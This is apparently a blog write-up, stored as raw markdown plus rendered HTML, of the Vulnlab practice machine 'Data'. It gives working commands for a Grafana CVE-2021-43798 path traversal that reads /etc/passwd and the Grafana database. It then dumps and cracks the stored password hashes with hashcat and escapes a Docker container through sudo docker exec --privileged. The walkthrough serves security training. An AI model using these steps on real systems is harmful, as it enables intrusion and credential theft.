starting\n......\nsha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:[...snip...]\n  \nSession..........: hashcat\nStatus...........: Cracked\n```\n\nIt seems as though we were able to successfully crack this hash and have obtained the password for the `boris` user. We would normally use this to authenticate to the machine, however I tested it through SSH and it seems that this password is also used for SSH as `boris`.\n\n![](/images/vulnlab/data-vl/c.jpg)\n\nNow that we have the user flag, we can move onto privilege escalation to try and obtain root.\n\n# Docker Breakout\n\nSo before interacted with anything, you'll see that the IP address on our command-line delimiter is different than the IP of the machine, being `10.10.10.11`. Furthermore, if you had looked at the MOTD from this machine when you authenticated, you can see that there is a network interface that we are connected to that has an IP address of `172.17.0.1`.\n\nThis indicates to me that we are currently logged into a docker interface, meaning we'll need to breakout of the container if we want to access the resources for root.\n\n```\nboris@ip-10-10-10-11:~$ sudo -l\nMatching Defaults entries for boris on ip-10-10-10-11:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser boris may run the following commands on ip-10-10-10-11:\n    (root) NOPASSWD: /snap/bin/docker exec *\n```\n\nIf you run `sudo -l` it seems as though we have sudo privileges to `/snap/bin/docker exec` and all of the contents of that specific binary. If we check the manual of the binary, we can see that it gives us a little more information on how to exploit it. You can find more information on how to exploit this using this HackTricks article [here](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation).\n\n```\nboris@ip-10-10-10-11:~$ sudo docker exec -h\nFlag shorthand -h has been deprecated, please use --help\n\nUsage:  docker exec [OPTIONS] CONTAINER COMMAND [ARG...]\n\nRun a command in a running container\n\nOptions:\n  -d, --detach               Detached mode: run command in the background\n      --detach-keys string   Override the key sequence for detaching a container\n  -e, --env list             Set environment variables\n      --env-file list        Read in a file of environment variables\n  -i, --interactive          Keep STDIN open even if not attached\n      --privileged           Give extended privileges to the command\n  -t, --tty                  Allocate a pseudo-TTY\n  -u, --user string          Username or UID (format: <name|uid>[:<group|gid>])\n  -w, --workdir string       Working directory inside the container\n```\n\nThere seems to be a `privileged` flag that we can run alongside the binary. This is most of what we'll need, the only exception being a valid container. If you attempt to enumerate any of the running containers, you won't be able to as we only have sudo access to `docker exec`. This means we'll need to try and find any running containers/container IDs, or just get lucky with a bit of guessing.\n\nFortunately enough we won't have to do any of that. If you run `ps awwfux` on this container, you'll see that there's already a container running in the context of root.\n\n```\nroot      1670  0.0  0.7 712860  7912 ?        Sl   16:11   0:00 /snap/docker/1125/bin/containerd-shim-runc-v2 -namespace moby -id e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 -address /run/snap.docker/containerd/containerd.sock\n```\n\nIt also shows us the specific ID of this container, meaning we can attach to it using our `docker exec` command.\n\n```\nboris@ip-10-10-10-11:~$ sudo docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 /bin/bash\nbash-5.1# whoami\nroot\n```\n\n# Mounting XVDA\n\nAlthough we are root, we aren't technically finished yet. We'll need to find the root flag, which is not currently on this machine as we are within a docker container.\n\nThrough a quick bit of research, I found that the `/root` filesystem of the docker controller is within `/dev/xvda1`, meaning we can mount that to a local directory on our container to view the contents.\n\n```\nbash-5.1# pwd\n/tmp/mount_xvda\nbash-5.1# mount /dev/xvda1 /tmp/mount_xvda\n```\n\nIf we access this specific directory where `xvda1` was mounted, we'll see the filesystem of the docker controller here.\n\n```\nbash-5.1# cd mount_xvda/\nbash-5.1# ls\nbin             home            lib64           opt             sbin            tmp             vmlinuz.old\nboot            initrd.img      lost+found      proc            snap            usr\ndev             initrd.img.old  media           root            srv             var\netc             lib             mnt             run             sys             vmlinuz\nbash-5.1# cd root\nbash-5.1# ls\nroot.txt  snap\n```\n\nAs you can see, we were successfully able to read the contents of the `/root` directory on the actual machine, meaning we have successfully completed this machine!\n\n# Conclusion\n\nAlthough I dislike Docker, this box was really fun altogether. Docker breakouts are trivial, however research into them is relatively straightforward and logically makes sense. The earlier parts of the machine were helpful as well, especially the portion where we needed to format the hash correctly before cracking it. Big thanks to xct for the development of this machine, as it helped a lot with practice.\n\n# Resources\n\nhttps://www.speedguide.net/port.php?port=3000\nhttps://grafana.com/docs/grafana/latest/introduction/\nhttps://github.com/wagneralves/CVE-2021-43798/tree/main\nhttps://book.hacktricks.xyz/network-services-pentesting/pentesting-web/grafana\nhttps://vulncheck.com/blog/grafana-cve-2021-43798\nhttps://gchq.github.io/CyberChef/\nhttps://hashcat.net/wiki/doku.php?id=example_hashes\nhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation","source":"_posts/data.md","raw":"---\ntitle: Data - Vulnlab\ndate: 2024-06-05 01:51:34\ntags: [vulnlab, Easy]\ncategories: vulnlab\nkeywords: 'Vulnlab, Easy, Linux'\ndescription: Data was another interesting machine that involved interacting with a Grafana web service and utilizing web-app exploits to gain access to a docker container. This is the first writeup that I've written that exploits docker breakout, so I hope I'll be able to explain it properly.\ncover: /images/vulnlab/data-vl/data_slide.png\ntop_img: /images/cyberpunk-red.jpg\ntoc: true\ntoc_number: false\n---\n\nData was another interesting machine that involved interacting with a Grafana web service and utilizing web-app exploits to gain access to a docker container. This is the first writeup that I've written that exploits docker breakout, so I hope I'll be able to explain it properly. \n\n# Enumeration\n\nLet's start with a basic NMAP scan.\n\n```\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-02 12:15 EDT\nNmap scan report for 10.10.64.184\nHost is up (0.12s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n3000/tcp open  ppp\n\nNmap done: 1 IP address (1 host up) scanned in 17.08 seconds\n```\n\nGiven that the only other port is SSH, we'll look towards port `3000` for the start of our attack path. You can find information about this specific port [here](https://www.speedguide.net/port.php?port=3000), which it seems as though that we are able to access it through HTTP based off an aggressive scan I ran afterwards.\n\n![](/images/vulnlab/data-vl/b.jpg)\n\nThis brings us to a Grafana landing page, one of the services that was listed on this port through the article I referenced earlier. The version of this application is `v8.0.0`, meaning we could potentially look for exploits for this specific version.\n\nAs for the service itself, Grafana seems to be a web application used for data visualization. While we're currently interacting with a login panel, authenticated users will be met with a framework/GUI that allows them to configure imported data from databases such as SQL. You can find more information about the service via the documentation [here](https://grafana.com/docs/grafana/latest/introduction/).\n\n# LFI via Plugins\n\nI did some research into this specific version `v8.0.0`, and it seems as though this is vulnerable to arbitrary file read via [CVE-2021-43798](https://github.com/wagneralves/CVE-2021-43798/tree/main). This essentially allows us to traverse through the website's root filesystem directly through the URL. The POC that I referenced does this manually for us - so we'll use it to determine if we can access to any files.\n\n```\n└─$ ./ExploitGrafana.sh -h http://10.10.64.184:3000 -f /etc/passwd\nPlugin alertlist Status code 200:\n  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 10.10.64.184:3000...\n* Connected to 10.10.64.184 (10.10.64.184) port 3000\n> GET /public/plugins/alertlist/../../../../../../../../../../../../..//etc/passwd HTTP/1.1\n> Host: 10.10.64.184:3000\n> User-Agent: curl/8.7.1\n> Accept: */*\n> \n* Request completely sent off\n< HTTP/1.1 200 OK\n```\n\nIt seems as though we were able to get a `200` response from the path traversal. You can see the GET request in the markdown above, and at the bottom of this commands output should be the `/etc/passwd` file of the machine. This confirms that the POC works and that the website is vulnerable.\n\nThat being said, we'll still need to be able to use this vulnerability to find credentials. This HackTricks [article](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/grafana) outlines a default file that we can grab that should have valid credentials to the website if it was installed with no further maintenance. The file that we are looking for is under `/var/lib/grafana/grafana.db`, the internal Grafana SQLITE database.\n\nWe can grab this easily with cURL, and we can save it to a file locally using `--output` to prevent it from being outputted to the terminal.\n\n```\n└─$ curl http://10.10.64.184:3000/public/plugins/alertlist/../../../../../../../../../..//var/lib/grafana/grafana.db --path-as-is --output grafana.db\n\n└─$ ls\nExploitGrafana.sh  README.md  grafana.db\n```\n\nNow that we have the Grafana database locally, we can read it with `sqlite3` and use `.dump` to dump out all the contents of the database.\nAlternatively, we can determine the specific table we want to look at by running `.tables`, which will tell us that there is a `user` table. We can then run `SELECT * from user;` to dump this table and all of its contents.\n\n```\nsqlite> SELECT * FROM user;\n1|0|admin|admin@localhost||7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S|hLLY6QQ4Y6||1|1|0||2022-01-23 12:48:04|2022-01-23 12:48:50|0|2022-01-23 12:48:50|0\n2|0|boris|boris@data.vl|boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|mYl941ma8w||1|0|0||2022-01-23 12:49:11|2022-01-23 12:49:11|0|2012-01-23 12:49:11|0\n```\n\n# Cracking Grafana Hashes\n\n```\nsqlite> select name,password,salt from user;\n|7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S\nboris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl\n```\n\nIt seems that we were able to dump the passwords, though they're in an odd format. If you'll notice, we have the password to the user's `boris` and `admin`, along with what looks to be a salt. Simply putting the password into a hash-identifier will not produce any results, we'll need to crack this hash given the salt.\n\nDoing some more research, I found an article [here](https://vulncheck.com/blog/grafana-cve-2021-43798) that explains a bit about the hashing algorithm that Grafana uses for this database. That is, at least for this version that we're currently on. It seems that the algorithm is just encoding the password and salts in Base64 before putting them after the `sha256:10000` identifier. Based on the article, the salt's are simply passed through a standard base64 encoding, which we can encode by using [CyberChef](https://gchq.github.io/CyberChef/).\n\nThe same cannot be said for the password, as the hexadecimal bytes of the plaintext password are passed into the base64 encoding. I created a little snippet of code that does this for us using Python.\n\n```Python\nimport binascii\nimport base64\n\nhashed_password = \"dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8\"\ndecoded_pass = bytes.fromhex(hashed_password)\nb64_enc = base64.b64encode(decoded_pass).decode('utf-8')\n\nprint(b64_enc)\n```\n\nAfter running the Python file above, we'll receive the proper base64 encoding of the password. We can now format the password locally in order to use it with Hashcat.\n\n```\nsha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=\n```\n\nThe specific hash identifier for `PBKDF2-HMAC-SHA256` can be found on Hashcat's documentation [here](https://hashcat.net/wiki/doku.php?id=example_hashes). The identifier we're looking for is `10900`.\n\n```\n└─$ hashcat -a 0 -m 10900 boris.txt /usr/share/wordlists/rockyou.txt\nhashcat (v6.2.6) starting\n......\nsha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:[...snip...]\n  \nSession..........: hashcat\nStatus...........: Cracked\n```\n\nIt seems as though we were able to successfully crack this hash and have obtained the password for the `boris` user. We would normally use this to authenticate to the machine, however I tested it through SSH and it seems that this password is also used for SSH as `boris`.\n\n![](/images/vulnlab/data-vl/c.jpg)\n\nNow that we have the user flag, we can move onto privilege escalation to try and obtain root.\n\n# Docker Breakout\n\nSo before interacted with anything, you'll see that the IP address on our command-line delimiter is different than the IP of the machine, being `10.10.10.11`. Furthermore, if you had looked at the MOTD from this machine when you authenticated, you can see that there is a network interface that we are connected to that has an IP address of `172.17.0.1`.\n\nThis indicates to me that we are currently logged into a docker interface, meaning we'll need to breakout of the container if we want to access the resources for root.\n\n```\nboris@ip-10-10-10-11:~$ sudo -l\nMatching Defaults entries for boris on ip-10-10-10-11:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser boris may run the following commands on ip-10-10-10-11:\n    (root) NOPASSWD: /snap/bin/docker exec *\n```\n\nIf you run `sudo -l` it seems as though we have sudo privileges to `/snap/bin/docker exec` and all of the contents of that specific binary. If we check the manual of the binary, we can see that it gives us a little more information on how to exploit it. You can find more information on how to exploit this using this HackTricks article [here](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation).\n\n```\nboris@ip-10-10-10-11:~$ sudo docker exec -h\nFlag shorthand -h has been deprecated, please use --help\n\nUsage:  docker exec [OPTIONS] CONTAINER COMMAND [ARG...]\n\nRun a command in a running container\n\nOptions:\n  -d, --detach               Detached mode: run command in the background\n      --detach-keys string   Override the key sequence for detaching a container\n  -e, --env list             Set environment variables\n      --env-file list        Read in a file of environment variables\n  -i, --interactive          Keep STDIN open even if not attached\n      --privileged           Give extended privileges to the command\n  -t, --tty                  Allocate a pseudo-TTY\n  -u, --user string          Username or UID (format: <name|uid>[:<group|gid>])\n  -w, --workdir string       Working directory inside the container\n```\n\nThere seems to be a `privileged` flag that we can run alongside the binary. This is most of what we'll need, the only exception being a valid container. If you attempt to enumerate any of the running containers, you won't be able to as we only have sudo access to `docker exec`. This means we'll need to try and find any running containers/container IDs, or just get lucky with a bit of guessing.\n\nFortunately enough we won't have to do any of that. If you run `ps awwfux` on this container, you'll see that there's already a container running in the context of root.\n\n```\nroot      1670  0.0  0.7 712860  7912 ?        Sl   16:11   0:00 /snap/docker/1125/bin/containerd-shim-runc-v2 -namespace moby -id e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 -address /run/snap.docker/containerd/containerd.sock\n```\n\nIt also shows us the specific ID of this container, meaning we can attach to it using our `docker exec` command.\n\n```\nboris@ip-10-10-10-11:~$ sudo docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 /bin/bash\nbash-5.1# whoami\nroot\n```\n\n# Mounting XVDA\n\nAlthough we are root, we aren't technically finished yet. We'll need to find the root flag, which is not currently on this machine as we are within a docker container.\n\nThrough a quick bit of research, I found that the `/root` filesystem of the docker controller is within `/dev/xvda1`, meaning we can mount that to a local directory on our container to view the contents.\n\n```\nbash-5.1# pwd\n/tmp/mount_xvda\nbash-5.1# mount /dev/xvda1 /tmp/mount_xvda\n```\n\nIf we access this specific directory where `xvda1` was mounted, we'll see the filesystem of the docker controller here.\n\n```\nbash-5.1# cd mount_xvda/\nbash-5.1# ls\nbin             home            lib64           opt             sbin            tmp             vmlinuz.old\nboot            initrd.img      lost+found      proc            snap            usr\ndev             initrd.img.old  media           root            srv             var\netc             lib             mnt             run             sys             vmlinuz\nbash-5.1# cd root\nbash-5.1# ls\nroot.txt  snap\n```\n\nAs you can see, we were successfully able to read the contents of the `/root` directory on the actual machine, meaning we have successfully completed this machine!\n\n# Conclusion\n\nAlthough I dislike Docker, this box was really fun altogether. Docker breakouts are trivial, however research into them is relatively straightforward and logically makes sense. The earlier parts of the machine were helpful as well, especially the portion where we needed to format the hash correctly before cracking it. Big thanks to xct for the development of this machine, as it helped a lot with practice.\n\n# Resources\n\nhttps://www.speedguide.net/port.php?port=3000\nhttps://grafana.com/docs/grafana/latest/introduction/\nhttps://github.com/wagneralves/CVE-2021-43798/tree/main\nhttps://book.hacktricks.xyz/network-services-pentesting/pentesting-web/grafana\nhttps://vulncheck.com/blog/grafana-cve-2021-43798\nhttps://gchq.github.io/CyberChef/\nhttps://hashcat.net/wiki/doku.php?id=example_hashes\nhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation","slug":"data","published":1,"updated":"2024-06-05T20:04:36.429Z","_id":"clx1f19ow0000ujufbfrucn4s","comments":1,"layout":"post","photos":[],"content":"<p>Data was another interesting machine that involved interacting with a Grafana web service and utilizing web-app exploits to gain access to a docker container. This is the first writeup that I’ve written that exploits docker breakout, so I hope I’ll be able to explain it properly. </p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>Let’s start with a basic NMAP scan.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-02 12:15 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.64.184</span><br><span class=\"line\">Host is up (0.12s latency).</span><br><span class=\"line\">Not shown: 998 closed tcp ports (reset)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">22/tcp   open  ssh</span><br><span class=\"line\">3000/tcp open  ppp</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 17.08 seconds</span><br></pre></td></tr></table></figure>\n\n<p>Given that the only other port is SSH, we’ll look towards port <code>3000</code> for the start of our attack path. You can find information about this specific port <a href=\"https://www.speedguide.net/port.php?port=3000\">here</a>, which it seems as though that we are able to access it through HTTP based off an aggressive scan I ran afterwards.</p>\n<p><img src=\"/images/vulnlab/data-vl/b.jpg\"></p>\n<p>This brings us to a Grafana landing page, one of the services that was listed on this port through the article I referenced earlier. The version of this application is <code>v8.0.0</code>, meaning we could potentially look for exploits for this specific version.</p>\n<p>As for the service itself, Grafana seems to be a web application used for data visualization. While we’re currently interacting with a login panel, authenticated users will be met with a framework&#x2F;GUI that allows them to configure imported data from databases such as SQL. You can find more information about the service via the documentation <a href=\"https://grafana.com/docs/grafana/latest/introduction/\">here</a>.</p>\n<h1 id=\"LFI-via-Plugins\"><a href=\"#LFI-via-Plugins\" class=\"headerlink\" title=\"LFI via Plugins\"></a>LFI via Plugins</h1><p>I did some research into this specific version <code>v8.0.0</code>, and it seems as though this is vulnerable to arbitrary file read via <a href=\"https://github.com/wagneralves/CVE-2021-43798/tree/main\">CVE-2021-43798</a>. This essentially allows us to traverse through the website’s root filesystem directly through the URL. The POC that I referenced does this manually for us - so we’ll use it to determine if we can access to any files.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ./ExploitGrafana.sh -h http://10.10.64.184:3000 -f /etc/passwd</span><br><span class=\"line\">Plugin alertlist Status code 200:</span><br><span class=\"line\">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class=\"line\">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class=\"line\">  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0*   Trying 10.10.64.184:3000...</span><br><span class=\"line\">* Connected to 10.10.64.184 (10.10.64.184) port 3000</span><br><span class=\"line\">&gt; GET /public/plugins/alertlist/../../../../../../../../../../../../..//etc/passwd HTTP/1.1</span><br><span class=\"line\">&gt; Host: 10.10.64.184:3000</span><br><span class=\"line\">&gt; User-Agent: curl/8.7.1</span><br><span class=\"line\">&gt; Accept: */*</span><br><span class=\"line\">&gt; </span><br><span class=\"line\">* Request completely sent off</span><br><span class=\"line\">&lt; HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure>\n\n<p>It seems as though we were able to get a <code>200</code> response from the path traversal. You can see the GET request in the markdown above, and at the bottom of this commands output should be the <code>/etc/passwd</code> file of the machine. This confirms that the POC works and that the website is vulnerable.</p>\n<p>That being said, we’ll still need to be able to use this vulnerability to find credentials. This HackTricks <a href=\"https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/grafana\">article</a> outlines a default file that we can grab that should have valid credentials to the website if it was installed with no further maintenance. The file that we are looking for is under <code>/var/lib/grafana/grafana.db</code>, the internal Grafana SQLITE database.</p>\n<p>We can grab this easily with cURL, and we can save it to a file locally using <code>--output</code> to prevent it from being outputted to the terminal.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ curl http://10.10.64.184:3000/public/plugins/alertlist/../../../../../../../../../..//var/lib/grafana/grafana.db --path-as-is --output grafana.db</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ ls</span><br><span class=\"line\">ExploitGrafana.sh  README.md  grafana.db</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the Grafana database locally, we can read it with <code>sqlite3</code> and use <code>.dump</code> to dump out all the contents of the database.<br>Alternatively, we can determine the specific table we want to look at by running <code>.tables</code>, which will tell us that there is a <code>user</code> table. We can then run <code>SELECT * from user;</code> to dump this table and all of its contents.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlite&gt; SELECT * FROM user;</span><br><span class=\"line\">1|0|admin|admin@localhost||7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S|hLLY6QQ4Y6||1|1|0||2022-01-23 12:48:04|2022-01-23 12:48:50|0|2022-01-23 12:48:50|0</span><br><span class=\"line\">2|0|boris|boris@data.vl|boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl|mYl941ma8w||1|0|0||2022-01-23 12:49:11|2022-01-23 12:49:11|0|2012-01-23 12:49:11|0</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Cracking-Grafana-Hashes\"><a href=\"#Cracking-Grafana-Hashes\" class=\"headerlink\" title=\"Cracking Grafana Hashes\"></a>Cracking Grafana Hashes</h1><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlite&gt; select name,password,salt from user;</span><br><span class=\"line\">|7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8|YObSoLj55S</span><br><span class=\"line\">boris|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8|LCBhdtJWjl</span><br></pre></td></tr></table></figure>\n\n<p>It seems that we were able to dump the passwords, though they’re in an odd format. If you’ll notice, we have the password to the user’s <code>boris</code> and <code>admin</code>, along with what looks to be a salt. Simply putting the password into a hash-identifier will not produce any results, we’ll need to crack this hash given the salt.</p>\n<p>Doing some more research, I found an article <a href=\"https://vulncheck.com/blog/grafana-cve-2021-43798\">here</a> that explains a bit about the hashing algorithm that Grafana uses for this database. That is, at least for this version that we’re currently on. It seems that the algorithm is just encoding the password and salts in Base64 before putting them after the <code>sha256:10000</code> identifier. Based on the article, the salt’s are simply passed through a standard base64 encoding, which we can encode by using <a href=\"https://gchq.github.io/CyberChef/\">CyberChef</a>.</p>\n<p>The same cannot be said for the password, as the hexadecimal bytes of the plaintext password are passed into the base64 encoding. I created a little snippet of code that does this for us using Python.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"></span><br><span class=\"line\">hashed_password = <span class=\"string\">&quot;dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8&quot;</span></span><br><span class=\"line\">decoded_pass = <span class=\"built_in\">bytes</span>.fromhex(hashed_password)</span><br><span class=\"line\">b64_enc = base64.b64encode(decoded_pass).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(b64_enc)</span><br></pre></td></tr></table></figure>\n\n<p>After running the Python file above, we’ll receive the proper base64 encoding of the password. We can now format the password locally in order to use it with Hashcat.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=</span><br></pre></td></tr></table></figure>\n\n<p>The specific hash identifier for <code>PBKDF2-HMAC-SHA256</code> can be found on Hashcat’s documentation <a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">here</a>. The identifier we’re looking for is <code>10900</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ hashcat -a 0 -m 10900 boris.txt /usr/share/wordlists/rockyou.txt</span><br><span class=\"line\">hashcat (v6.2.6) starting</span><br><span class=\"line\">......</span><br><span class=\"line\">sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:[...snip...]</span><br><span class=\"line\">  </span><br><span class=\"line\">Session..........: hashcat</span><br><span class=\"line\">Status...........: Cracked</span><br></pre></td></tr></table></figure>\n\n<p>It seems as though we were able to successfully crack this hash and have obtained the password for the <code>boris</code> user. We would normally use this to authenticate to the machine, however I tested it through SSH and it seems that this password is also used for SSH as <code>boris</code>.</p>\n<p><img src=\"/images/vulnlab/data-vl/c.jpg\"></p>\n<p>Now that we have the user flag, we can move onto privilege escalation to try and obtain root.</p>\n<h1 id=\"Docker-Breakout\"><a href=\"#Docker-Breakout\" class=\"headerlink\" title=\"Docker Breakout\"></a>Docker Breakout</h1><p>So before interacted with anything, you’ll see that the IP address on our command-line delimiter is different than the IP of the machine, being <code>10.10.10.11</code>. Furthermore, if you had looked at the MOTD from this machine when you authenticated, you can see that there is a network interface that we are connected to that has an IP address of <code>172.17.0.1</code>.</p>\n<p>This indicates to me that we are currently logged into a docker interface, meaning we’ll need to breakout of the container if we want to access the resources for root.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">boris@ip-10-10-10-11:~$ sudo -l</span><br><span class=\"line\">Matching Defaults entries for boris on ip-10-10-10-11:</span><br><span class=\"line\">    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin</span><br><span class=\"line\"></span><br><span class=\"line\">User boris may run the following commands on ip-10-10-10-11:</span><br><span class=\"line\">    (root) NOPASSWD: /snap/bin/docker exec *</span><br></pre></td></tr></table></figure>\n\n<p>If you run <code>sudo -l</code> it seems as though we have sudo privileges to <code>/snap/bin/docker exec</code> and all of the contents of that specific binary. If we check the manual of the binary, we can see that it gives us a little more information on how to exploit it. You can find more information on how to exploit this using this HackTricks article <a href=\"https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation\">here</a>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">boris@ip-10-10-10-11:~$ sudo docker exec -h</span><br><span class=\"line\">Flag shorthand -h has been deprecated, please use --help</span><br><span class=\"line\"></span><br><span class=\"line\">Usage:  docker exec [OPTIONS] CONTAINER COMMAND [ARG...]</span><br><span class=\"line\"></span><br><span class=\"line\">Run a command in a running container</span><br><span class=\"line\"></span><br><span class=\"line\">Options:</span><br><span class=\"line\">  -d, --detach               Detached mode: run command in the background</span><br><span class=\"line\">      --detach-keys string   Override the key sequence for detaching a container</span><br><span class=\"line\">  -e, --env list             Set environment variables</span><br><span class=\"line\">      --env-file list        Read in a file of environment variables</span><br><span class=\"line\">  -i, --interactive          Keep STDIN open even if not attached</span><br><span class=\"line\">      --privileged           Give extended privileges to the command</span><br><span class=\"line\">  -t, --tty                  Allocate a pseudo-TTY</span><br><span class=\"line\">  -u, --user string          Username or UID (format: &lt;name|uid&gt;[:&lt;group|gid&gt;])</span><br><span class=\"line\">  -w, --workdir string       Working directory inside the container</span><br></pre></td></tr></table></figure>\n\n<p>There seems to be a <code>privileged</code> flag that we can run alongside the binary. This is most of what we’ll need, the only exception being a valid container. If you attempt to enumerate any of the running containers, you won’t be able to as we only have sudo access to <code>docker exec</code>. This means we’ll need to try and find any running containers&#x2F;container IDs, or just get lucky with a bit of guessing.</p>\n<p>Fortunately enough we won’t have to do any of that. If you run <code>ps awwfux</code> on this container, you’ll see that there’s already a container running in the context of root.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">root      1670  0.0  0.7 712860  7912 ?        Sl   16:11   0:00 /snap/docker/1125/bin/containerd-shim-runc-v2 -namespace moby -id e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 -address /run/snap.docker/containerd/containerd.sock</span><br></pre></td></tr></table></figure>\n\n<p>It also shows us the specific ID of this container, meaning we can attach to it using our <code>docker exec</code> command.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">boris@ip-10-10-10-11:~$ sudo docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 /bin/bash</span><br><span class=\"line\">bash-5.1# whoami</span><br><span class=\"line\">root</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Mounting-XVDA\"><a href=\"#Mounting-XVDA\" class=\"headerlink\" title=\"Mounting XVDA\"></a>Mounting XVDA</h1><p>Although we are root, we aren’t technically finished yet. We’ll need to find the root flag, which is not currently on this machine as we are within a docker container.</p>\n<p>Through a quick bit of research, I found that the <code>/root</code> filesystem of the docker controller is within <code>/dev/xvda1</code>, meaning we can mount that to a local directory on our container to view the contents.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">bash-5.1# pwd</span><br><span class=\"line\">/tmp/mount_xvda</span><br><span class=\"line\">bash-5.1# mount /dev/xvda1 